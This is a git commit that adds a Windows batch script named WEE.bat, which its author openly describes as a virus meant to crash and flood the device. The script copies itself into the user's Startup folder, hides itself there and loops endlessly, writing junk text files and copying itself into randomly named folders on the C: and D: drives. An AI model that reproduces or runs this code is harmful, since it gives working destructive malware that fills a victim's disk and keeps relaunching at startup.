023b711abdfc56951cfafb96a2618e73f5b40f0a
FOX GAMINGYT <105371123+FoxGamingYTCR@users.noreply.github.com>
2022-05-11 15:17:29 -0400

    WEE.bat virus
    yet another virus from me, this should crash and flood the device pretty fast.

---
+++ WEE.bat
@@ -0,0 +1,17 @@
+@echo off
+move WEE.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /y
+attrib +s +h "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WEE.bat"
+:1
+echo %random%xd%random%lol >> C:\%random%xd%random%lol.txt
+copy WEE.bat C:\%random%xd%random%lol /y
+copy WEE.bat D:\%random%xd%random%lol /y
+copy WEE.bat C:\lol%random%xd%random% /y
+copy WEE.bat D:\lol%random%xd%random% /y
+echo %random%xd%random%lol >> C:\%random%xd%random%lol.txt
+open C:\%random%xd%random%lol\WEE.bat
+open D:\%random%xd%random%lol\WEE.bat
+open C:\lol%random%xd%random%\WEE.bat
+open D:\lol%random%xd%random%\WEE.bat
+echo %random%xd%random%lol >> C:\%random%xd%random%lol.txt
+start "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WEE.bat"
+goto :1
